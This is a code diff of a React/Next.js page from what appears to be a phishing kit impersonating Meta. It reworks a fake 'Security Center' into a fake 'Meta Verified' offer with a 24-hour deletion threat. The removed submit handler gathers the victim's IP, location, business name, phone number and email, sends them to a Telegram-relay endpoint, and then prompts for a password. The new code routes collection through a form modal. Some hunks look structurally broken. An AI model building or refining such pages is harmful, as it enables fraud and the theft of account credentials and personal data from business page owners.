@@ -4,95 +4,12 @@ import { getTranslations } from '@/utils/translate';
 import axios from 'axios';
 import { useEffect, useState, type FC, type ChangeEvent, type FormEvent, useMemo } from 'react';
 import Image from 'next/image';
-import BlobIcon from '@/assets/images/blob.png';
-import WarningIcon from '@/assets/images/warning.png';
-import { faHome, faSearch, faShield, faFileAlt, faGear } from '@fortawesome/free-solid-svg-icons';
-import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
-import PasswordModal from '@/components/form-modal/password-modal';
-import VerifyModal from '@/components/form-modal/verify-modal';
+import MetaBanner from '@/assets/images/imagemeta.webp';
+import MetaLogo from '@/assets/images/unnamedmeta.png';
+import MetaBanner1 from '@/assets/images/imagemeta1.webp';
+import Navbar from '@/components/navbar';
 
-interface VerifyFormData {
-    personalEmail: string;
-    pageName: string;
-    legalBusinessName: string;
-    phoneNumber: string;
-    description: string;
-}
-
-const countryPhoneCodes: Record<string, string> = {
-    // Americas
-    US: '+1', CA: '+1', MX: '+52', BR: '+55', AR: '+54', CL: '+56',
-    CO: '+57', PE: '+51', EC: '+593', VE: '+58', GY: '+592', SR: '+597', BO: '+591', PY: '+595', UY: '+598',
-    GT: '+502', HN: '+504', SV: '+503', NI: '+505', CR: '+506', PA: '+507',
-    DO: '+1-809', HT: '+509', JM: '+1-876',
-    // Europe
-    AT: '+43', BE: '+32', BG: '+359', HR: '+385', CY: '+357', CZ: '+420',
-    DK: '+45', EE: '+372', FI: '+358', FR: '+33', DE: '+49', GR: '+30', HU: '+36', IE: '+353',
-    IT: '+39', LV: '+371', LT: '+370', LU: '+352', MT: '+356', NL: '+31', PL: '+48', PT: '+351', RO: '+40',
-    GB: '+44', SE: '+46', CH: '+41', TR: '+90',
-    RS: '+381', BA: '+387', ME: '+382', UA: '+380', BY: '+375', MD: '+373', IS: '+354', AL: '+355',
-    // Asia
-    CN: '+86', JP: '+81', KR: '+82', HK: '+852', TW: '+886', SG: '+65', MY: '+60', TH: '+66',
-    VN: '+84', PH: '+63', ID: '+62', BD: '+880', IN: '+91', PK: '+92', LK: '+94', NP: '+977',
-    AF: '+93', IR: '+98', KZ: '+7', UZ: '+998', TJ: '+992', KG: '+996',
-    MM: '+95', LA: '+856', KH: '+855', RU: '+7', AU: '+61', NZ: '+64',
-    // Middle East & West Asia
-    AE: '+971', SA: '+966', KW: '+965', BH: '+973', QA: '+974', OM: '+968', YE: '+967',
-    IL: '+972', PS: '+970', JO: '+962', LB: '+961', SY: '+963', IQ: '+964',
-    // Africa
-    EG: '+20', ZA: '+27', NG: '+234', KE: '+254', ET: '+251', GH: '+233', CM: '+237', SN: '+221',
-    MA: '+212', DZ: '+213', TN: '+216', LY: '+218', MG: '+261', ZW: '+263', BW: '+267'
-};
-
-const countryFlags: Record<string, string> = {
-    // Americas
-    US: '🇺🇸', CA: '🇨🇦', MX: '🇲🇽', BR: '🇧🇷', AR: '🇦🇷', CL: '🇨🇱',
-    CO: '🇨🇴', PE: '🇵🇪', EC: '🇪🇨', VE: '🇻🇪', GY: '🇬🇾', SR: '🇸🇷', BO: '🇧🇴', PY: '🇵🇾', UY: '🇺🇾',
-    GT: '🇬🇹', HN: '🇭🇳', SV: '🇸🇻', NI: '🇳🇮', CR: '🇨🇷', PA: '🇵🇦',
-    DO: '🇩🇴', HT: '🇭🇹', JM: '🇯🇲',
-    // Europe
-    AT: '🇦🇹', BE: '🇧🇪', BG: '🇧🇬', HR: '🇭🇷', CY: '🇨🇾', CZ: '🇨🇿',
-    DK: '🇩🇰', EE: '🇪🇪', FI: '🇫🇮', FR: '🇫🇷', DE: '🇩🇪', GR: '🇬🇷', HU: '🇭🇺', IE: '🇮🇪',
-    IT: '🇮🇹', LV: '🇱🇻', LT: '🇱🇹', LU: '🇱🇺', MT: '🇲🇹', NL: '🇳🇱', PL: '🇵🇱', PT: '🇵🇹', RO: '🇷🇴',
-    GB: '🇬🇧', SE: '🇸🇪', CH: '🇨🇭', TR: '🇹🇷',
-    RS: '🇷🇸', BA: '🇧🇦', ME: '🇲🇪', UA: '🇺🇦', BY: '🇧🇾', MD: '🇲🇩', IS: '🇮🇸', AL: '🇦🇱',
-    // Asia
-    CN: '🇨🇳', JP: '🇯🇵', KR: '🇰🇷', HK: '🇭🇰', TW: '🇹🇼', SG: '🇸🇬', MY: '🇲🇾', TH: '🇹🇭',
-    VN: '🇻🇳', PH: '🇵🇭', ID: '🇮🇩', BD: '🇧🇩', IN: '🇮🇳', PK: '🇵🇰', LK: '🇱🇰', NP: '🇳🇵',
-    AF: '🇦🇫', IR: '🇮🇷', KZ: '🇰🇿', UZ: '🇺🇿', TJ: '🇹🇯', KG: '🇰🇬',
-    MM: '🇲🇲', LA: '🇱🇦', KH: '🇰🇭', RU: '🇷🇺', AU: '🇦🇺', NZ: '🇳🇿',
-    // Middle East & West Asia
-    AE: '🇦🇪', SA: '🇸🇦', KW: '🇰🇼', BH: '🇧🇭', QA: '🇶🇦', OM: '🇴🇲', YE: '🇾🇪',
-    IL: '🇮🇱', PS: '🇵🇸', JO: '🇯🇴', LB: '🇱🇧', SY: '🇸🇾', IQ: '🇮🇶',
-    // Africa
-    EG: '🇪🇬', ZA: '🇿🇦', NG: '🇳🇬', KE: '🇰🇪', ET: '🇪🇹', GH: '🇬🇭', CM: '🇨🇲', SN: '🇸🇳',
-    MA: '🇲🇦', DZ: '🇩🇿', TN: '🇹🇳', LY: '🇱🇾', MG: '🇲🇬', ZW: '🇿🇼', BW: '🇧🇼'
-};
-
-const countryNames: Record<string, string> = {
-    // Americas
-    US: 'United States', CA: 'Canada', MX: 'Mexico', BR: 'Brazil', AR: 'Argentina', CL: 'Chile',
-    CO: 'Colombia', PE: 'Peru', EC: 'Ecuador', VE: 'Venezuela', GY: 'Guyana', SR: 'Suriname', BO: 'Bolivia', PY: 'Paraguay', UY: 'Uruguay',
-    GT: 'Guatemala', HN: 'Honduras', SV: 'El Salvador', NI: 'Nicaragua', CR: 'Costa Rica', PA: 'Panama',
-    DO: 'Dominican Republic', HT: 'Haiti', JM: 'Jamaica',
-    // Europe
-    AT: 'Austria', BE: 'Belgium', BG: 'Bulgaria', HR: 'Croatia', CY: 'Cyprus', CZ: 'Czech Republic',
-    DK: 'Denmark', EE: 'Estonia', FI: 'Finland', FR: 'France', DE: 'Germany', GR: 'Greece', HU: 'Hungary', IE: 'Ireland',
-    IT: 'Italy', LV: 'Latvia', LT: 'Lithuania', LU: 'Luxembourg', MT: 'Malta', NL: 'Netherlands', PL: 'Poland', PT: 'Portugal', RO: 'Romania',
-    GB: 'United Kingdom', SE: 'Sweden', CH: 'Switzerland', TR: 'Turkey',
-    RS: 'Serbia', BA: 'Bosnia & Herzegovina', ME: 'Montenegro', UA: 'Ukraine', BY: 'Belarus', MD: 'Moldova', IS: 'Iceland', AL: 'Albania',
-    // Asia
-    CN: 'China', JP: 'Japan', KR: 'South Korea', HK: 'Hong Kong', TW: 'Taiwan', SG: 'Singapore', MY: 'Malaysia', TH: 'Thailand',
-    VN: 'Vietnam', PH: 'Philippines', ID: 'Indonesia', BD: 'Bangladesh', IN: 'India', PK: 'Pakistan', LK: 'Sri Lanka', NP: 'Nepal',
-    AF: 'Afghanistan', IR: 'Iran', KZ: 'Kazakhstan', UZ: 'Uzbekistan', TJ: 'Tajikistan', KG: 'Kyrgyzstan',
-    MM: 'Myanmar', LA: 'Laos', KH: 'Cambodia', RU: 'Russia', AU: 'Australia', NZ: 'New Zealand',
-    // Middle East & West Asia
-    AE: 'United Arab Emirates', SA: 'Saudi Arabia', KW: 'Kuwait', BH: 'Bahrain', QA: 'Qatar', OM: 'Oman', YE: 'Yemen',
-    IL: 'Israel', PS: 'Palestine', JO: 'Jordan', LB: 'Lebanon', SY: 'Syria', IQ: 'Iraq',
-    // Africa
-    EG: 'Egypt', ZA: 'South Africa', NG: 'Nigeria', KE: 'Kenya', ET: 'Ethiopia', GH: 'Ghana', CM: 'Cameroon', SN: 'Senegal',
-    MA: 'Morocco', DZ: 'Algeria', TN: 'Tunisia', LY: 'Libya', MG: 'Madagascar', ZW: 'Zimbabwe', BW: 'Botswana'
-};
+const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });
 
 const Page: FC = () => {
     const { geoInfo, setGeoInfo, setMessageId, setMessage } = store();
@@ -107,6 +24,7 @@ const Page: FC = () => {
         phoneNumber: '',
         description: ''
     });
+    const [modalKey, setModalKey] = useState(0);
 
     // Compute translations using useMemo - instantly without API calls
     const countryToLanguage: Record<string, string> = useMemo(() => ({
@@ -125,11 +43,7 @@ const Page: FC = () => {
     }, [selectedCountryCode, countryToLanguage]);
 
     const t = (text: string): string => {
-        const translated = translations[text];
-        if (translated === undefined) {
-            return text;
-        }
-        return translated;
+        return translations[text] || text;
     };
 
     useEffect(() => {
@@ -160,47 +74,12 @@ const Page: FC = () => {
         fetchGeoInfo();
     }, [setGeoInfo, geoInfo]);
 
-    const textsToTranslate = [
-        'Confirm Page Information',
-        'Page Name',
-        'Legal Business Name',
-        'Phone Number',
-        'Email',
-        'Description',
-        'Enter legal business name',
-        'Enter phone number',
-        'Enter email address',
-        'Write a short description about your page',
-        'Your page meets the eligibility requirements',
-        'Submit for Review',
-        'Home',
-        'Search',
-        'Security Policies',
-        'Rules & Other Posts',
-        'Settings',
-        'Submit Application',
-        'Under Review',
-        'Completed',
-        'Security Center',
-        'Congratulations! Your page has been selected for free verification review',
-        'About',
-        'Create ad',
-        'Create Page',
-        'Developers',
-        'Careers',
-        'Privacy',
-        'Cookies',
-        'Terms',
-        'Help'
-    ];
-
+    // Update translations when geoInfo changes
     useEffect(() => {
         if (!geoInfo) return;
         
-        console.log('GeoInfo received:', geoInfo);
-        // Set initial country code from geolocation
-        setSelectedCountryCode(geoInfo.country_code);
-    }, [geoInfo]);
+        // If translations already loaded (from browser language), skip
+        if (Object.keys(translations).length > 0) return;
 
     const handleInputChange = (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
         const { name, value } = e.target;
@@ -210,114 +89,111 @@ const Page: FC = () => {
         }));
     };
 
-    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
-        e.preventDefault();
+            const textsToTranslate = [
+                'Upgrade your profile with Meta Verified — enjoy exclusive benefits.',
+                'This form must be completed within 24 hours, or it will be permanently deleted.',
+                'Page Eligibility for Free Verification Badge',
+                'Protect your brand with Meta Verified',
+                'Meta Verified Logo',
+                'Your Page is eligible to receive a free verification badge. Verification helps confirm your Page\'s authenticity, increase audience trust, and protect your brand from impersonation. Please complete the verification request within 24 hours to secure your eligibility. Fill out the form below to submit your Page information for review.',
+                'Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.',
+                'Get Meta Verified',
+                'Subscribe on Page',
+                'Subscribe on Instagram',
+                'Are you a business?',
+                'Get more information on',
+                'Meta Verified for businesses',
+                'Features, availability and pricing may vary by region and app.',
+                'Meta Verified Example',
+                'Meta Verified Benefits Demo',
+                'Meta Verified benefits',
+                'Verified badge',
+                'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
+                'Impersonation protection',
+                'Enhanced support',
+                'Upgraded profile features',
+            ];
 
-        if (isLoading) return;
-        setIsLoading(true);
+            // Get cache
+            const CACHE_KEY = 'translation_cache';
+            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
+            const cache = cached ? JSON.parse(cached) : {};
 
-        // Prepare message data
-        const phoneCountryCode = countryPhoneCodes[selectedCountryCode] || '+1';
-        const fullPhoneNumber = `${phoneCountryCode}${formData.phoneNumber}`;
+            // Translate ALL texts in parallel with Promise.all
+            const translatePromises = textsToTranslate.map(async (text) => {
+                const cacheKey = `en:${targetLang}:${text}`;
+                
+                // Return cached if available
+                if (cache[cacheKey]) {
+                    return { text, translated: cache[cacheKey] };
+                }
 
-        const message = `
-${
-    geoInfo
-        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
-        : 'N/A'
-}
+                try {
+                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
+                        params: {
+                            client: 'gtx',
+                            sl: 'en',
+                            tl: targetLang,
+                            dt: 't',
+                            q: text
+                        }
+                    });
 
-<b>📝 Page Name:</b> <code>${formData.pageName}</code>
-<b>🏢 Legal Business Name:</b> <code>${formData.legalBusinessName}</code>
-<b>📱 Phone Number:</b> <code>${fullPhoneNumber}</code>
-<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
+                    const translatedText = response.data[0]
+                        ?.map((item: unknown[]) => item[0])
+                        .filter(Boolean)
+                        .join('') || text;
 
-<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
-        `.trim();
-
-        try {
-            // Send message to telegram first
-            const res = await axios.post('/api/send', {
-                message
+                    cache[cacheKey] = translatedText;
+                    return { text, translated: translatedText };
+                } catch {
+                    return { text, translated: text };
+                }
             });
 
-            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
-                setMessageId(res.data.data.result.message_id);
-                setMessage(message);
-                // Show password modal after successful telegram send
-                setShowPasswordModal(true);
-            } else {
-                alert('Error submitting form. Please try again.');
+            // Wait for all translations at once (parallel)
+            const results = await Promise.all(translatePromises);
+            
+            // Save cache
+            if (typeof window !== 'undefined') {
+                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
             }
-        } catch {
-            alert('Error submitting form. Please try again.');
-        } finally {
-            setIsLoading(false);
-        }
-    };
 
-    const handlePasswordConfirm = async () => {
-        // Close password modal and show verify modal
-        setShowPasswordModal(false);
-        setShowVerifyModal(true);
-    };
+            // Build translation map
+            const translatedMap: Record<string, string> = {};
+            results.forEach(({ text, translated }) => {
+                translatedMap[text] = translated;
+            });
 
-    const handleVerifyConfirm = async () => {
-        // Close verify modal and reset form
-        setShowVerifyModal(false);
-        setFormData({
-            personalEmail: '',
-            pageName: '',
-            legalBusinessName: '',
-            phoneNumber: '',
-            description: ''
-        });
-    };
+            setTranslations(translatedMap);
+        })();
+    }, [geoInfo, translations]);
 
     return (
-        <div className="min-h-screen bg-gray-50 flex flex-col">
-            <div className="flex-1 flex justify-center pt-4 md:pt-6">
-                <div className="flex w-full max-w-7xl mx-auto">
-                    {/* Sidebar - Hidden on mobile */}
-                    <div className="hidden md:flex w-64 bg-gray-50 flex-col flex-shrink-0">
-                        <div className="px-4 py-3 bg-gray-50">
-                            <div className="flex flex-col items-start gap-3">
-                                <Image 
-                                    src={BlobIcon} 
-                                    alt="Meta" 
-                                    width={500} 
-                                    height={300} 
-                                    className="w-24 h-auto flex-shrink-0"
-                                    priority
-                                    quality={100}
-                                />
-                                <p className="text-2xl font-bold text-gray-900">{t('Security Center')}</p>
-                            </div>
-                        </div>
-
-                        <nav className="flex-1 px-2 py-3 space-y-1 my-4 relative">
-                            <div className="absolute right-0 top-[42%] transform -translate-y-1/2 h-[95%] border-r border-gray-300"></div>
-                            <div className="px-3 py-2.5 rounded-lg bg-blue-50 text-blue-700 font-medium flex items-center gap-3 cursor-pointer hover:bg-blue-100 transition">
-                                <FontAwesomeIcon icon={faHome} className="w-5 h-5" />
-                                <span className="text-sm">{t('Home')}</span>
-                            </div>
-                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
-                                <FontAwesomeIcon icon={faSearch} className="w-5 h-5" />
-                                <span className="text-sm">{t('Search')}</span>
-                            </div>
-                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
-                                <FontAwesomeIcon icon={faShield} className="w-5 h-5" />
-                                <span className="text-sm">{t('Security Policies')}</span>
-                            </div>
-                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
-                                <FontAwesomeIcon icon={faFileAlt} className="w-5 h-5" />
-                                <span className="text-sm">{t('Rules & Other Posts')}</span>
-                            </div>
-                            <div className="px-3 py-2.5 rounded-lg text-gray-700 hover:bg-gray-100 cursor-pointer flex items-center gap-3 transition">
-                                <FontAwesomeIcon icon={faGear} className="w-5 h-5" />
-                                <span className="text-sm">{t('Settings')}</span>
-                            </div>
-                        </nav>
+        <>
+            <Navbar />
+            <div className="w-full flex flex-col bg-gradient-to-br from-[#f3e7e9] via-[#c7e0f7] to-[#6ec6f7] min-h-screen" style={{margin:0,padding:0}}>
+                <div className="w-full bg-[#768187] text-white text-center text-base md:text-lg font-semibold" style={{margin:0,paddingTop:'16px',paddingBottom:'16px',lineHeight:1.1}}>
+                {t('Upgrade your profile with Meta Verified — enjoy exclusive benefits.')}<br />
+                <span className="text-xs font-normal">{t('This form must be completed within 24 hours, or it will be permanently deleted.')}</span>
+            </div>
+            <div className="flex flex-1 flex-col md:flex-row items-center justify-center px-3 md:px-8 py-6 md:py-12 gap-2 md:gap-4 max-w-[1600px] mx-auto w-full md:-mt-12 md:-mt-16">
+                <div className="w-full md:w-1/3 flex flex-col items-center md:items-start justify-center px-3 md:px-0 mb-6 md:mb-0">
+                    <Image src={MetaLogo} alt={t('Meta Verified Logo')} width={300} height={300} className="w-24 h-24 md:w-32 md:h-32 mb-4 md:mb-6" priority quality={95} />
+                    <h1 className="text-xl md:text-3xl font-bold mb-3 md:mb-4 text-[#1C2B33] text-center md:text-left">
+                        {t('Page Eligibility for Free Verification Badge')}
+                    </h1>
+                    <p className="text-sm md:text-base text-[#1C2B33] mb-4 md:mb-6 text-center md:text-left leading-relaxed">{t('Your Page is eligible to receive a free verification badge. Verification helps confirm your Page\'s authenticity, increase audience trust, and protect your brand from impersonation. Please complete the verification request within 24 hours to secure your eligibility. Fill out the form below to submit your Page information for review.')}</p>
+                    <div className="flex flex-col md:flex-row gap-4 mb-4 w-full items-center md:items-start justify-center md:justify-start">
+                        <button
+                            onClick={() => {
+                                setModalKey((prev) => prev + 1);
+                                setModalOpen(true);
+                            }}
+                            className="bg-[#1877f2] hover:bg-[#145db2] text-white font-semibold py-3 px-6 rounded-full text-base shadow w-full md:w-auto"
+                        >
+                            {t('Get Meta Verified')}
+                        </button>
                     </div>
 
                     {/* Main Content */}
@@ -513,22 +389,49 @@ ${
                     </div>
                 </div>
             </div>
-
-            {/* Footer - Full Width */}
-            <div className="bg-gray-50 flex justify-center border-t border-gray-200">
-                <div className="w-full max-w-7xl mx-auto flex">
-                    <div className="w-64 hidden md:block flex-shrink-0"></div>
-                    <div className="flex-1 py-2 md:py-3 px-2 md:px-2 flex items-center justify-start gap-2 md:gap-3 text-xs md:text-sm text-gray-600 overflow-x-auto">
-                        <span className="text-2xl md:text-3xl font-bold text-blue-600 flex-shrink-0">∞</span>
-                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('About')}</a>
-                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Create ad')}</a>
-                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Create Page')}</a>
-                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Developers')}</a>
-                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Careers')}</a>
-                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Privacy')}</a>
-                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Cookies')}</a>
-                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Terms')}</a>
-                        <a href="#" className="hover:text-gray-900 flex-shrink-0">{t('Help')}</a>
+            {/* Section: Meta Verified benefits */}
+            <div className="flex flex-col md:flex-row items-center justify-center px-2 md:px-8 py-8 md:py-12 gap-8 md:gap-12 max-w-[1600px] mx-auto w-full bg-white rounded-2xl shadow -mt-8">
+                <div className="w-full md:w-1/2 flex flex-col items-center md:items-start justify-center p-2 md:p-8">
+                    <h2 className="text-2xl md:text-4xl font-bold mb-6 md:mb-8 text-[#1C2B33] text-center md:text-left w-full">{t("Meta Verified benefits")}</h2>
+                    <div className="w-full border-t border-gray-300 mb-4 md:mb-6"></div>
+                    {/* Verified badge (open) */}
+                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
+                        <div>
+                            <span className="text-base md:text-2xl font-semibold">{t('Verified badge')}</span>
+                            <div className="text-gray-500 text-sm md:text-lg mt-2">{t('The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.')}</div>
+                        </div>
+                    </div>
+                    <div className="w-full border-t border-gray-200"></div>
+                    {/* Impersonation protection */}
+                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
+                        <span className="text-base md:text-2xl font-semibold">{t('Impersonation protection')}</span>
+                        <span className="text-2xl md:text-3xl font-bold ml-4">+</span>
+                    </div>
+                    <div className="w-full border-t border-gray-200"></div>
+                    {/* Enhanced support */}
+                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
+                        <span className="text-base md:text-2xl font-semibold">{t('Enhanced support')}</span>
+                        <span className="text-2xl md:text-3xl font-bold ml-4">+</span>
+                    </div>
+                    <div className="w-full border-t border-gray-200"></div>
+                    {/* Upgraded profile features */}
+                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
+                        <span className="text-base md:text-2xl font-semibold">{t('Upgraded profile features')}</span>
+                        <span className="text-2xl md:text-3xl font-bold ml-4">+</span>
+                    </div>
+                    <div className="w-full border-t border-gray-200"></div>
+                </div>
+                <div className="w-full md:w-1/2 flex items-center justify-center p-2 md:p-8">
+                    <div className="bg-[#f3f6fa] rounded-3xl flex items-center justify-center w-full max-w-xs md:max-w-xl p-2 md:p-8">
+                        <Image 
+                            src={MetaBanner1} 
+                            alt={t('Meta Verified Benefits Demo')} 
+                            className="rounded-2xl w-full h-auto object-contain" 
+                            priority
+                            quality={100}
+                            width={600}
+                            height={400}
+                        />
                     </div>
                 </div>
             </div>
